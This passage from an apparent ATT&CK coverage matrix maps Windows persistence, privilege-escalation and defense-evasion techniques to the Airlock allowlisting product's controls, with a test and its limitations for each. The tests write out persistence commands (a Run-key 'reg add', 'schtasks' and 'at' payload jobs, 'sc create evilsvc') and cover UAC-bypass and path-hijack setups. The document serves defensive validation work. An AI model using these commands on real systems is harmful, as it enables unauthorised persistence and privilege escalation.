Autostart registration (reg keys, startup folder) not prevented. Payload blocked at boot/logon when execution is attempted.

**Test:** reg add HKCU\...\Run /v evil /d C:\Temp\mal.exe -> registration succeeds, mal.exe blocked at logon.

**Limitations:** Registration mechanism not prevented. Airlock controls the execution of the payload, not the persistence setup.

### T1547.001 - Registry Run Keys / Startup Folder
**Yes** 🟢 | default-deny | Testable: yes

Registry Run keys / Startup folder. Target exe must be trusted.

**Test:** 1) Run key to unsigned exe -> blocked at logon. 2) Startup folder shortcut to unsigned exe -> blocked.

**Limitations:** Reg/folder modification not prevented.

### T1547.002 - Authentication Package
**Yes** 🟢 | DLL-control | Testable: yes

Authentication package DLL. Loaded by lsass. Must be trusted.

**Test:** Register untrusted auth package DLL -> blocked at load.

**Limitations:** Reg mod not prevented.

### T1547.003 - Time Providers
**Yes** 🟢 | DLL-control | Testable: yes

Time providers DLL. Loaded by w32time. Must be trusted.

**Test:** Register untrusted time provider DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1547.004 - Winlogon Helper DLL
**Yes** 🟢 | DLL-control | Testable: yes

Winlogon helper DLL. Loaded at logon. Must be trusted.

**Test:** Untrusted Winlogon helper DLL -> blocked at logon.

**Limitations:** Reg mod not prevented.

### T1547.005 - Security Support Provider
**Yes** 🟢 | DLL-control | Testable: yes

Security Support Provider DLL. Loaded by lsass. Must be trusted.

**Test:** Untrusted SSP DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1547.008 - LSASS Driver
**Yes** 🟢 | default-deny + blocklist (predefined) | Testable: yes

Attackers register a malicious driver or DLL to be loaded by the LSASS process at boot (e.g., SSP, authentication package). LSASS itself is not blocked - it's a critical Windows process. The untrusted driver/DLL that LSASS tries to load IS blocked by DLL control. Microsoft Recommended Driver Block Rules predefined blocklist covers known malicious drivers even if signed.

**Test:** 1) Register untrusted DLL as authentication package via registry -> DLL blocked when LSASS loads it at boot. 2) Import MS Driver Block Rules -> known bad drivers blocked even if signed.

**Limitations:** Legitimate signed drivers/DLLs from trusted publishers load normally. Registry modification to register the payload is not prevented.

### T1547.009 - Shortcut Modification
**Yes** 🟢 | default-deny | Testable: yes

Shortcut modification. Target exe must be trusted.

**Test:** Modified shortcut to unsigned exe -> blocked when used.

**Limitations:** Shortcut modification not prevented.

### T1547.010 - Port Monitors
**Yes** 🟢 | DLL-control | Testable: yes

Port monitors DLL. Loaded by spoolsv.exe. Must be trusted.

**Test:** Untrusted port monitor DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1547.012 - Print Processors
**Yes** 🟢 | DLL-control | Testable: yes

Print processors DLL. Loaded by spoolsv.exe. Must be trusted.

**Test:** Untrusted print processor DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1547.014 - Active Setup
**Yes** 🟢 | default-deny | Testable: yes

Active Setup. StubPath exe must be trusted.

**Test:** Active Setup StubPath to unsigned exe -> blocked at logon.

**Limitations:** Reg mod not prevented.

### T1554 - Compromise Host Software Binary
**Yes** 🟢 | default-deny | Testable: yes

Replacing a trusted binary with malicious version. If hash changes (it will), new binary must be trusted. Publisher trust: if attacker signs with different cert, blocked.

**Test:** Replace trusted app exe with unsigned version -> blocked on next launch (hash mismatch).

**Limitations:** If trusted by path rule (not hash), replacement at same path may run. Prefer hash/publisher trust over path rules.

### T1556 - Modify Authentication Process
**No** ⚪ | none (sub-technique dependent)

Modify authentication process. Modifies login/auth mechanisms. Some sub-techniques involve DLL loading.

**Test:** See sub-techniques.

### T1556.001 - Domain Controller Authentication
**Yes** 🟢 | DLL-control | Testable: yes

Domain controller auth DLL. Password filter loaded by lsass. Must be trusted.

**Test:** Untrusted password filter DLL on DC -> blocked.

**Limitations:** DC/server focused.

### T1556.002 - Password Filter DLL
**Yes** 🟢 | DLL-control | Testable: yes

Password filter DLL. Loaded by lsass on password change. Must be trusted.

**Test:** Untrusted password filter DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1556.005 - Reversible Encryption
**No** ⚪ | none

Reversible encryption. AD policy change. No file execution.

**Limitations:** AD security.

### T1556.006 - Multi-Factor Authentication
**No** ⚪ | none

MFA interception. Identity plane.

**Limitations:** MFA security.

### T1556.007 - Hybrid Identity
**No** ⚪ | none

Hybrid identity. Cloud/identity plane.

### T1556.008 - Network Provider DLL
**Yes** 🟢 | DLL-control | Testable: yes

Network provider DLL. Loaded at logon. Must be trusted.

**Test:** Untrusted network provider DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1574 - Hijack Execution Flow
**Yes** 🟢 | DLL-control + default-deny | Testable: yes

Hijack execution flow - DLL control is the primary defense. Untrusted DLLs blocked at load regardless of the hijack vector (search order, sideloading, COR_PROFILER, etc).

**Test:** Place untrusted DLL in trusted app directory -> DLL blocked at load.

**Limitations:** Memory-only hijacks (T1574.013 KernelCallbackTable) operate inside trusted process memory - not caught. Trusted-signed DLLs pass publisher trust.

### T1574.001 - DLL
**Yes** 🟢 | DLL-control | Testable: yes

DLL search order hijacking. Malicious DLL in app directory. Must be trusted.

**Test:** Unsigned DLL with legitimate name in app dir -> blocked.

**Limitations:** Strongest control against common malware technique.

### T1574.005 - Executable Installer File Permissions Weakness
**Yes** 🟢 | default-deny | Testable: partial

Executable installer file perms weakness. Replacement must be trusted.

**Test:** Replace installer exe with unsigned -> blocked on service restart.

**Limitations:** File replacement itself is OS permissions issue.

### T1574.007 - Path Interception by PATH Environment Variable
**Yes** 🟢 | default-deny | Testable: yes

Path interception by PATH env var. Malicious exe in high-priority PATH dir. Must be trusted.

**Test:** Unsigned exe named common_tool.exe in PATH dir -> blocked.

**Limitations:** If placed in path-trusted directory, may run.

### T1574.008 - Path Interception by Search Order Hijacking
**Yes** 🟢 | default-deny | Testable: yes

Path interception by search order. Same principle as .007.

**Test:** Unsigned exe in directory searched before legitimate -> blocked.

**Limitations:** Path rule coverage important.

### T1574.009 - Path Interception by Unquoted Path
**Yes** 🟢 | default-deny | Testable: yes

Unquoted path interception. Attacker places exe at shorter path. Must be trusted.

**Test:** Unquoted 'C:\Program Files\App\svc.exe' -> place C:\Program.exe (unsigned) -> blocked.

**Limitations:** Classic technique caught cleanly.

### T1574.010 - Services File Permissions Weakness
**Yes** 🟢 | default-deny | Testable: partial

Services file perms weakness. Replace service binary. Must be trusted.

**Test:** Replace service binary with unsigned -> restart blocked.

**Limitations:** File replacement is OS perms issue.

### T1574.011 - Services Registry Permissions Weakness
**Yes** 🟢 | default-deny | Testable: yes

Services registry perms weakness. Modify ImagePath to malicious exe. Must be trusted.

**Test:** Modify service ImagePath to unsigned exe -> start blocked.

**Limitations:** Reg mod not prevented.

### T1574.012 - COR_PROFILER
**Yes** 🟢 | DLL-control | Testable: yes

COR_PROFILER .NET profiler DLL. Must be trusted.

**Test:** Set COR_PROFILER to untrusted DLL -> blocked when .NET app starts.

**Limitations:** Env var mod not prevented.

### T1574.013 - KernelCallbackTable
**No** ⚪ | none

KernelCallbackTable. In-memory manipulation of trusted process.

**Test:** N/A - in-memory. EDR territory.

### T1574.014 - AppDomainManager
**Yes** 🟢 | DLL-control | Testable: yes

AppDomainManager injection. .NET config loads attacker DLL. Must be trusted.

**Test:** Malicious .config pointing to untrusted DLL -> blocked.

**Limitations:** Config file modification not prevented.

### T1653 - Power Settings
**No** ⚪ | none

Power settings. Modifying power config to prevent sleep. No file execution.

**Limitations:** OS configuration, not execution.

### T1668 - Exclusive Control
**No** ⚪ | none

Exclusive control. Mutex/lock to prevent other instances. Behavioral, inside trusted process.


## PRIVILEGE-ESCALATION (75 techniques - 47 covered)

### T1037 - Boot or Logon Initialization Scripts
**Yes** 🟢 | script-control + default-deny | Testable: yes

Boot/logon init scripts. Script content must be trusted via script control. Untrusted scripts blocked at logon.

**Test:** Set GPO logon script to untrusted .bat -> blocked at logon.

**Limitations:** Script path configuration not prevented.

### T1037.001 - Logon Script (Windows)
**Yes** 🟢 | script-control + default-deny | Testable: yes

Logon scripts (Windows). Script file must be trusted. Scripts in NETLOGON share: if path-trusted, runs.

**Test:** Place untrusted .bat in NETLOGON, assign via GPO -> blocked on target at logon.

**Limitations:** Legitimate scripts in trusted paths run. Replacing trusted script at same path could work if path-trusted.

### T1037.003 - Network Logon Script
**Yes** 🟢 | script-control + default-deny | Testable: yes

Network logon script. Same principle as T1037.001 but via network logon.

**Test:** Untrusted network logon script -> blocked.

**Limitations:** Same path trust caveats.

### T1053 - Scheduled Task/Job
**Yes** 🟢 | default-deny | Testable: yes

Task scheduling tools are trusted OS utilities. Task creation not blocked. Payload blocked when task fires if untrusted.

**Test:** schtasks /create /tn test /tr C:\Temp\payload.exe /sc once /st 12:00 -> creates OK. When task fires, payload.exe blocked.

**Limitations:** Task creation succeeds. Trusted-signed payloads run.

### T1053.002 - At
**Yes** 🟢 | default-deny + blocklist | Testable: yes

at utility schedules tasks. at.exe can be blocklisted. Payload blocked at execution time.

**Test:** at 12:00 C:\Temp\malware.exe -> job creates, exe blocked at scheduled time.

**Limitations:** Job creation not prevented.

### T1053.005 - Scheduled Task
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Windows Task Scheduler. schtasks.exe trusted. Payload must be trusted when task fires. schtasks.exe restrictable via blocklist metarules.

**Test:** schtasks /create /tn evil /tr C:\Temp\payload.exe -> OK. On fire, payload blocked.

**Limitations:** Task creation not prevented. PS one-liners via -Command not caught if PS trusted.

### T1055 - Process Injection
**No** ⚪ | DLL-control (conditional) | Testable: partial

Process injection (parent). Injecting code into trusted process memory. Airlock doesn't monitor memory operations. If injection requires loading a DLL from disk, DLL control catches it.

**Test:** DLL injection where DLL is a file on disk -> DLL must be trusted. Memory-only injection -> not caught.

**Limitations:** Primary gap. EDR territory for memory-based injection.

### T1055.001 - Dynamic-link Library Injection
**Yes** 🟢 | DLL-control | Testable: yes

DLL injection via LoadLibrary - DLL file must exist on disk and be trusted. Airlock blocks untrusted DLL at load time.

**Test:** CreateRemoteThread + LoadLibrary with untrusted DLL -> DLL blocked at load.

**Limitations:** Reflective DLL injection (loaded entirely from memory, no file on disk) not caught - that's EDR territory.

### T1055.002 - Portable Executable Injection
**No** ⚪ | none

PE injection. Writing PE directly into process memory. No file on disk.

**Test:** N/A - memory-only.

**Limitations:** EDR territory.

### T1055.003 - Thread Execution Hijacking
**No** ⚪ | none

Thread execution hijacking. Modifying existing thread in trusted process. Memory-level.

### T1055.004 - Asynchronous Procedure Call
**No** ⚪ | none

Asynchronous procedure call (APC) injection. Memory-level.

### T1055.005 - Thread Local Storage
**No** ⚪ | none

Thread local storage injection. Memory-level.

### T1055.011 - Extra Window Memory Injection
**No** ⚪ | none

Extra window memory injection. Memory-level.

### T1055.012 - Process Hollowing
**No** ⚪ | DLL-control (conditional) | Testable: partial

Process hollowing creates a suspended process with a trusted binary, then replaces its image in memory. The memory replacement is invisible to Airlock. The initial process uses a trusted binary so Airlock allows it.

**Test:** N/A - memory manipulation of trusted process.

**Limitations:** If hollowing stages payload as file on disk first, that file is checked. Pure memory hollowing not caught. EDR territory.

### T1055.013 - Process Doppelgänging
**No** ⚪ | default-deny (potentially) | Testable: partial

Process doppelganging uses NTFS transactions to create a file, load it into memory, then roll back the transaction. The file never persists on disk. Airlock's kernel driver may or may not intercept the transacted file load - needs lab validation.

**Test:** Needs lab testing to confirm whether Airlock's kernel driver intercepts file loads during NTFS transactions.

**Limitations:** Uncertain coverage. Treat as not covered until validated.

### T1055.015 - ListPlanting
**No** ⚪ | none

ListPlanting. Message-based code execution in trusted process. Memory-level.

### T1068 - Exploitation for Privilege Escalation
**No** ⚪ | none

Exploitation for privilege escalation is about abusing a vulnerability in software or the kernel to gain elevated privileges. The exploit runs inside a trusted process or at kernel level. Airlock doesn't detect or prevent exploits. Post-exploitation payload deployment is covered under execution techniques.

**Limitations:** Exploit prevention (Windows Exploit Guard), patching, least privilege, and EDR behavioral detection are the controls.

### T1078 - Valid Accounts
**No** ⚪ | none

Valid accounts. Using legitimate credentials. Identity plane. No file execution.

**Limitations:** Post-access, Airlock enforces on tools attacker runs with valid creds.

### T1078.001 - Default Accounts
**No** ⚪ | none

Default accounts. Identity.

### T1078.002 - Domain Accounts
**No** ⚪ | none

Domain accounts. Identity.

### T1078.003 - Local Accounts
**No** ⚪ | none

Local accounts. Identity.

### T1098 - Account Manipulation
**No** ⚪ | none

Account manipulation. Identity-plane operation. No file execution.

**Limitations:** Identity/directory security.

### T1098.002 - Additional Email Delegate Permissions
**No** ⚪ | none

Additional email delegate permissions. No file execution.

### T1098.005 - Device Registration
**No** ⚪ | none

Device registration. MDM/identity plane.

### T1098.007 - Additional Local or Domain Groups
**Yes** 🟢 | blocklist-metarule | Testable: yes

net.exe used for group manipulation. Restrictable via blocklist metarule for non-admins.

**Test:** Metarule: original_filename 'net' AND user NOT admin -> blocks net group/localgroup manipulation.

**Limitations:** PowerShell AD cmdlets still available if PS is trusted for the user.

### T1134 - Access Token Manipulation
**No** ⚪ | none

Access token manipulation. API-level operations inside trusted process. No file execution.

**Limitations:** If tool for token manipulation is untrusted, tool itself blocked.

### T1134.001 - Token Impersonation/Theft
**No** ⚪ | none

Token impersonation/theft. API-level.

### T1134.002 - Create Process with Token
**No** ⚪ | default-deny | Testable: partial

Process created with stolen token - the process binary must be trusted, but token manipulation itself is API-level and not caught.

**Limitations:** Token manipulation is identity/API level. EDR territory.

### T1134.003 - Make and Impersonate Token
**No** ⚪ | none

Make and impersonate token. API-level.

### T1134.004 - Parent PID Spoofing
**No** ⚪ | default-deny | Testable: partial

Parent PID spoofing is API-level process creation. Binary must be trusted but spoofing is not detected.

**Limitations:** May affect Airlock process trust rules that key on parent process. Test.

### T1134.005 - SID-History Injection
**No** ⚪ | none

SID-History injection. Identity/AD manipulation.

### T1484 - Domain or Tenant Policy Modification
**No** ⚪ | none

Domain/tenant policy modification. AD/cloud policy changes. No file execution.

**Limitations:** AD security.

### T1484.001 - Group Policy Modification
**No** ⚪ | none

Group policy modification. AD operation.

**Limitations:** If modified GPO delivers untrusted software, execution blocked on endpoints.

### T1484.002 - Trust Modification
**No** ⚪ | none

Trust modification. AD trust changes.

### T1543 - Create or Modify System Process
**Yes** 🟢 | default-deny | Testable: yes

Service creation succeeds (sc create not prevented). Service binary blocked at start if untrusted. sc.exe can be blocklisted for non-admins.

**Test:** sc create evilsvc binPath= C:\Temp\evil.exe -> creation OK. sc start evilsvc -> binary blocked.

**Limitations:** Service registration not prevented. Airlock controls the execution of the service binary, not the service configuration.

### T1543.003 - Windows Service
**Yes** 🟢 | default-deny + DLL-control + blocklist | Testable: yes

Windows Service. Binary/DLL must be trusted. Service DLLs via svchost blocked. sc.exe blocklist-controllable.

**Test:** 1) sc create unsigned exe -> start blocked. 2) Malicious svchost service DLL -> blocked. 3) Blocklist sc.exe for non-admins.

**Limitations:** Service creation not prevented.

### T1546 - Event Triggered Execution
**Yes** 🟢 | default-deny + script-control + DLL-control | Testable: yes

Event triggered execution (parent). Code launched by event triggers must be trusted.

**Test:** Varies by sub-technique. Trigger registers OK, payload blocked.

### T1546.001 - Change Default File Association
**Yes** 🟢 | default-deny | Testable: yes

Change default file association. Handler exe must be trusted.

**Test:** assoc .txt to evil handler exe -> exe blocked when .txt opened.

**Limitations:** Reg mod not prevented.

### T1546.002 - Screensaver
**Yes** 🟢 | default-deny | Testable: yes

Screensaver .scr (PE executable). Must be trusted.

**Test:** Set screensaver to untrusted .scr -> blocked on activation.

**Limitations:** .scr files are PE executables, full allowlist enforcement.

### T1546.003 - Windows Management Instrumentation Event Subscription
**Yes** 🟢 | default-deny + script-control | Testable: yes

WMI event subscription. Payload launched by wmiprvse must be trusted. Script payloads via script control.

**Test:** WMI event sub launching unsigned exe -> blocked when event fires.

**Limitations:** Subscription creation not prevented.

### T1546.007 - Netsh Helper DLL
**Yes** 🟢 | DLL-control | Testable: yes

Netsh helper DLL. Must be trusted to load.

**Test:** netsh add helper unsigned.dll -> blocked at load.

**Limitations:** netsh.exe trusted; DLL registration succeeds, load blocked.

### T1546.008 - Accessibility Features
**Yes** 🟢 | default-deny | Testable: yes

Accessibility features (sethc.exe, utilman.exe). Replacement binary must be trusted by hash. Blocklist metarule on original_filename catches renamed trusted tools (e.g., cmd.exe renamed to sethc.exe).

**Test:** Replace sethc.exe with untrusted binary -> blocked at lock screen activation. Blocklist original_filename 'cmd' -> catches cmd.exe renamed to sethc.exe.

**Limitations:** If attacker copies a trusted binary with matching hash, it runs. Original filename metarule is the defense against renamed trusted tools.

### T1546.009 - AppCert DLLs
**Yes** 🟢 | DLL-control | Testable: yes

AppCert DLLs. Loaded into every CreateProcess caller. Must be trusted.

**Test:** Register untrusted AppCert DLL -> blocked at load.

**Limitations:** Reg mod not prevented.

### T1546.010 - AppInit DLLs
**Yes** 🟢 | DLL-control | Testable: yes

AppInit DLLs. Loaded into user-mode processes. Must be trusted.

**Test:** Register untrusted AppInit DLL -> blocked.

**Limitations:** Disabled by default with Secure Boot.

### T1546.011 - Application Shimming
**Yes** 🟢 | DLL-control + blocklist | Testable: yes

Application shimming. sdbinst.exe can be blocklisted. Shim-loaded DLLs must be trusted.

**Test:** 1) Blocklist sdbinst.exe. 2) Shim loading untrusted DLL -> blocked.

**Limitations:** If shim redirects to trusted binary, not inspected.

### T1546.012 - Image File Execution Options Injection
**Yes** 🟢 | default-deny | Testable: yes

IFEO debugger. Debugger binary must be trusted.

**Test:** IFEO debugger set to unsigned exe -> blocked when target launched.

**Limitations:** Reg mod not prevented. Trusted debugger (cmd.exe) runs.

### T1546.013 - PowerShell Profile
**Yes** 🟢 | script-control | Testable: yes

PowerShell profile. profile.ps1 must be trusted via script control.

**Test:** Drop malicious profile.ps1 -> blocked at PS startup if untrusted.

**Limitations:** If profile is path-trusted, runs. Audit path rules.

### T1546.015 - Component Object Model Hijacking
**Yes** 🟢 | DLL-control | Testable: yes

COM hijacking. Malicious DLL registered as COM object. Must be trusted.

**Test:** Untrusted DLL as COM object -> blocked when instantiated.

**Limitations:** Reg mod not prevented.

### T1546.016 - Installer Packages
**Yes** 🟢 | script-control | Testable: yes

Installer packages (MSI). Blocked via script control (MSI is covered type).

**Test:** Drop untrusted .msi -> blocked.

**Limitations:** Trusted-signed MSIs from trusted publishers install normally.

### T1546.018 - Python Startup Hooks
**Yes** 🟢 | script-control + default-deny | Testable: yes

Python startup hooks. Python interpreter must be allowlisted. Startup hook .py must be trusted via script control.

**Test:** 1) python.exe not allowlisted -> blocked. 2) Untrusted startup .py -> blocked.

**Limitations:** If python trusted and hook in trusted path, runs.

### T1547 - Boot or Logon Autostart Execution
**Yes** 🟢 | default-deny + DLL-control | Testable: yes

Autostart registration (reg keys, startup folder) not prevented. Payload blocked at boot/logon when execution is attempted.

**Test:** reg add HKCU\...\Run /v evil /d C:\Temp\mal.exe -> registration succeeds, mal.exe blocked at logon.

**Limitations:** Registration mechanism not prevented. Airlock controls the execution of the payload, not the persistence setup.

### T1547.001 - Registry Run Keys / Startup Folder
**Yes** 🟢 | default-deny | Testable: yes

Registry Run keys / Startup folder. Target exe must be trusted.

**Test:** 1) Run key to unsigned exe -> blocked at logon. 2) Startup folder shortcut to unsigned exe -> blocked.

**Limitations:** Reg/folder modification not prevented.

### T1547.002 - Authentication Package
**Yes** 🟢 | DLL-control | Testable: yes

Authentication package DLL. Loaded by lsass. Must be trusted.

**Test:** Register untrusted auth package DLL -> blocked at load.

**Limitations:** Reg mod not prevented.

### T1547.003 - Time Providers
**Yes** 🟢 | DLL-control | Testable: yes

Time providers DLL. Loaded by w32time. Must be trusted.

**Test:** Register untrusted time provider DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1547.004 - Winlogon Helper DLL
**Yes** 🟢 | DLL-control | Testable: yes

Winlogon helper DLL. Loaded at logon. Must be trusted.

**Test:** Untrusted Winlogon helper DLL -> blocked at logon.

**Limitations:** Reg mod not prevented.

### T1547.005 - Security Support Provider
**Yes** 🟢 | DLL-control | Testable: yes

Security Support Provider DLL. Loaded by lsass. Must be trusted.

**Test:** Untrusted SSP DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1547.008 - LSASS Driver
**Yes** 🟢 | default-deny + blocklist (predefined) | Testable: yes

Attackers register a malicious driver or DLL to be loaded by the LSASS process at boot (e.g., SSP, authentication package). LSASS itself is not blocked - it's a critical Windows process. The untrusted driver/DLL that LSASS tries to load IS blocked by DLL control. Microsoft Recommended Driver Block Rules predefined blocklist covers known malicious drivers even if signed.

**Test:** 1) Register untrusted DLL as authentication package via registry -> DLL blocked when LSASS loads it at boot. 2) Import MS Driver Block Rules -> known bad drivers blocked even if signed.

**Limitations:** Legitimate signed drivers/DLLs from trusted publishers load normally. Registry modification to register the payload is not prevented.

### T1547.009 - Shortcut Modification
**Yes** 🟢 | default-deny | Testable: yes

Shortcut modification. Target exe must be trusted.

**Test:** Modified shortcut to unsigned exe -> blocked when used.

**Limitations:** Shortcut modification not prevented.

### T1547.010 - Port Monitors
**Yes** 🟢 | DLL-control | Testable: yes

Port monitors DLL. Loaded by spoolsv.exe. Must be trusted.

**Test:** Untrusted port monitor DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1547.012 - Print Processors
**Yes** 🟢 | DLL-control | Testable: yes

Print processors DLL. Loaded by spoolsv.exe. Must be trusted.

**Test:** Untrusted print processor DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1547.014 - Active Setup
**Yes** 🟢 | default-deny | Testable: yes

Active Setup. StubPath exe must be trusted.

**Test:** Active Setup StubPath to unsigned exe -> blocked at logon.

**Limitations:** Reg mod not prevented.

### T1548 - Abuse Elevation Control Mechanism
**Yes** 🟢 | default-deny | Testable: partial

UAC bypass techniques often involve DLL hijacking in auto-elevate apps or registry modification pointing to untrusted payload. DLL control blocks hijacked DLLs. Untrusted payloads from registry-based bypasses blocked.

**Test:** 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked.

**Limitations:** Registry-based bypasses where payload is a trusted binary (cmd.exe) succeed - use blocklist to restrict.

### T1548.002 - Bypass User Account Control
**Yes** 🟢 | DLL-control + default-deny | Testable: yes

UAC bypass. Various methods: DLL hijacking in auto-elevate apps (DLL must be trusted), mock trusted dirs, fodhelper.exe registry abuse. DLL hijack UAC bypasses caught by DLL control. Registry-based UAC bypasses using trusted auto-elevate binaries: the trusted binary runs, but any untrusted payload it loads is blocked.

**Test:** 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked. 3) Blocklist common UAC bypass tools.

**Limitations:** Registry-based bypasses where payload is trusted binary (e.g., cmd.exe) succeed. Use blocklist to restrict.

### T1574 - Hijack Execution Flow
**Yes** 🟢 | DLL-control + default-deny | Testable: yes

Hijack execution flow - DLL control is the primary defense. Untrusted DLLs blocked at load regardless of the hijack vector (search order, sideloading, COR_PROFILER, etc).

**Test:** Place untrusted DLL in trusted app directory -> DLL blocked at load.

**Limitations:** Memory-only hijacks (T1574.013 KernelCallbackTable) operate inside trusted process memory - not caught. Trusted-signed DLLs pass publisher trust.

### T1574.001 - DLL
**Yes** 🟢 | DLL-control | Testable: yes

DLL search order hijacking. Malicious DLL in app directory. Must be trusted.

**Test:** Unsigned DLL with legitimate name in app dir -> blocked.

**Limitations:** Strongest control against common malware technique.

### T1574.005 - Executable Installer File Permissions Weakness
**Yes** 🟢 | default-deny | Testable: partial

Executable installer file perms weakness. Replacement must be trusted.

**Test:** Replace installer exe with unsigned -> blocked on service restart.

**Limitations:** File replacement itself is OS permissions issue.

### T1574.007 - Path Interception by PATH Environment Variable
**Yes** 🟢 | default-deny | Testable: yes

Path interception by PATH env var. Malicious exe in high-priority PATH dir. Must be trusted.

**Test:** Unsigned exe named common_tool.exe in PATH dir -> blocked.

**Limitations:** If placed in path-trusted directory, may run.

### T1574.008 - Path Interception by Search Order Hijacking
**Yes** 🟢 | default-deny | Testable: yes

Path interception by search order. Same principle as .007.

**Test:** Unsigned exe in directory searched before legitimate -> blocked.

**Limitations:** Path rule coverage important.

### T1574.009 - Path Interception by Unquoted Path
**Yes** 🟢 | default-deny | Testable: yes

Unquoted path interception. Attacker places exe at shorter path. Must be trusted.

**Test:** Unquoted 'C:\Program Files\App\svc.exe' -> place C:\Program.exe (unsigned) -> blocked.

**Limitations:** Classic technique caught cleanly.

### T1574.010 - Services File Permissions Weakness
**Yes** 🟢 | default-deny | Testable: partial

Services file perms weakness. Replace service binary. Must be trusted.

**Test:** Replace service binary with unsigned -> restart blocked.

**Limitations:** File replacement is OS perms issue.

### T1574.011 - Services Registry Permissions Weakness
**Yes** 🟢 | default-deny | Testable: yes

Services registry perms weakness. Modify ImagePath to malicious exe. Must be trusted.

**Test:** Modify service ImagePath to unsigned exe -> start blocked.

**Limitations:** Reg mod not prevented.

### T1574.012 - COR_PROFILER
**Yes** 🟢 | DLL-control | Testable: yes

COR_PROFILER .NET profiler DLL. Must be trusted.

**Test:** Set COR_PROFILER to untrusted DLL -> blocked when .NET app starts.

**Limitations:** Env var mod not prevented.

### T1574.013 - KernelCallbackTable
**No** ⚪ | none

KernelCallbackTable. In-memory manipulation of trusted process.

**Test:** N/A - in-memory. EDR territory.

### T1574.014 - AppDomainManager
**Yes** 🟢 | DLL-control | Testable: yes

AppDomainManager injection. .NET config loads attacker DLL. Must be trusted.

**Test:** Malicious .config pointing to untrusted DLL -> blocked.

**Limitations:** Config file modification not prevented.

### T1611 - Escape to Host
**No** ⚪ | none

Escape to host from container. Container/VM escape. Not standard Windows endpoint scenario.

**Limitations:** Container security.


## DEFENSE-EVASION (165 techniques - 77 covered)

### T1006 - Direct Volume Access
**No** ⚪ | none

Direct volume access. Reads raw disk sectors bypassing file system. Operates inside trusted process using API calls. Airlock doesn't monitor raw disk access.

**Limitations:** If tool performing direct volume access is untrusted, the tool itself is blocked.

### T1014 - Rootkit
**Yes** 🟢 | default-deny (driver load) | Testable: partial

Rootkit as a driver must be trusted to load. Airlock kernel driver intercepts driver loads. MS Recommended Driver Block Rules predefined blocklist covers known malicious drivers.

**Test:** Untrusted rootkit driver -> blocked at load. Import MS Driver Block Rules for known bad drivers.

**Limitations:** Post-load kernel manipulation not caught. Rootkits already in memory are EDR/Secure Boot territory.

### T1027 - Obfuscated Files or Information
**Yes** 🟢 | default-deny | Testable: partial

Obfuscation changes file hash. Obfuscated variant has unknown hash -> not in allowlist -> blocked by default-deny. This is a fundamental strength of allowlisting over signature-based detection.

**Test:** Obfuscated exe with unique hash -> blocked (not in allowlist).

**Limitations:** If obfuscated file retains valid publisher signature, may pass publisher trust.

### T1027.001 - Binary Padding
**Yes** 🟢 | default-deny | Testable: yes

Binary padding. Changes hash. Padded binary won't match allowlisted hash.

**Test:** Padded exe -> new hash -> not in allowlist -> blocked.

**Limitations:** Publisher trust still applies if signature valid.

### T1027.002 - Software Packing
**Yes** 🟢 | default-deny | Testable: yes

Software packing. Packed exe has different hash than original. Not in allowlist.

**Test:** UPX-packed malware -> unique hash -> blocked.

**Limitations:** If packer preserves valid publisher signature, may pass publisher trust. Rare in practice.

### T1027.003 - Steganography
**No** ⚪ | default-deny (if extracted payload executed) | Testable: partial

Steganography. Data hidden in images. No file execution until payload extracted.

**Test:** Stego payload extracted and executed -> blocked if untrusted.

**Limitations:** Extraction happens inside trusted process.

### T1027.004 - Compile After Delivery
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Source code delivered, compiled on target. Compiled output has new hash -> blocked by default-deny. Compilers (csc.exe, vbc.exe) are MS-signed but can be explicitly blocklisted to prevent compilation entirely.

**Test:** 1) Compile .cs with csc.exe -> output exe blocked (untrusted hash). 2) Blocklist csc.exe/vbc.exe for non-developers.

**Limitations:** Compilers are MS-signed and may be publisher-trusted. Without explicit blocklist, compilation can occur but output is still blocked.

### T1027.005 - Indicator Removal from Tools
**Yes** 🟢 | default-deny | Testable: partial

Modified tool has new hash -> not in allowlist -> blocked.

**Test:** Modified tool -> new hash -> blocked.

### T1027.006 - HTML Smuggling
**Yes** 🟢 | default-deny + script-control | Testable: yes

HTML smuggling. Malicious file assembled from HTML/JS in browser. When user saves and executes, file must be trusted.

**Test:** HTML smuggling assembles exe in browser -> user saves to disk -> runs -> blocked.

**Limitations:** Assembly happens in browser JS. Execution blocked.

### T1027.007 - Dynamic API Resolution
**No** ⚪ | none

Dynamic API resolution. Runtime technique inside trusted process. No file execution.

**Limitations:** In-process behavior.

### T1027.008 - Stripped Payloads
**Yes** 🟢 | default-deny | Testable: partial

Stripped payload has new hash -> not in allowlist -> blocked.

**Test:** Stripped exe -> blocked.

### T1027.009 - Embedded Payloads
**Yes** 🟢 | default-deny | Testable: partial

Embedded payload extracted and executed. Extracted payload must be trusted.

**Test:** Extracted payload executed -> blocked if untrusted.

**Limitations:** Extraction happens inside trusted process - not caught. Execution of extracted file IS caught.

### T1027.010 - Command Obfuscation
**No** ⚪ | none

Command obfuscation. Obfuscated commands in trusted interpreter. Airlock doesn't inspect command content.

**Limitations:** Inline commands in trusted interpreter not inspected regardless of obfuscation.

### T1027.011 - Fileless Storage
**No** ⚪ | none

Fileless storage. Malicious content stored in registry/WMI/etc. No file on disk to hash.

**Limitations:** If fileless payload eventually loads DLL/exe, that load is checked.

### T1027.012 - LNK Icon Smuggling
**Yes** 🟢 | default-deny | Testable: partial

LNK triggering payload execution. Payload must be trusted.

**Test:** LNK triggering untrusted payload -> blocked.

**Limitations:** LNK file itself not controlled.

### T1027.013 - Encrypted/Encoded File
**Yes** 🟢 | default-deny | Testable: partial

Encrypted/encoded file must be decrypted before execution. Decrypted payload must be trusted.

**Test:** Encrypted payload decrypted to disk, executed -> blocked.

**Limitations:** Decryption inside trusted process not caught. Execution of decrypted file IS caught.

### T1027.014 - Polymorphic Code
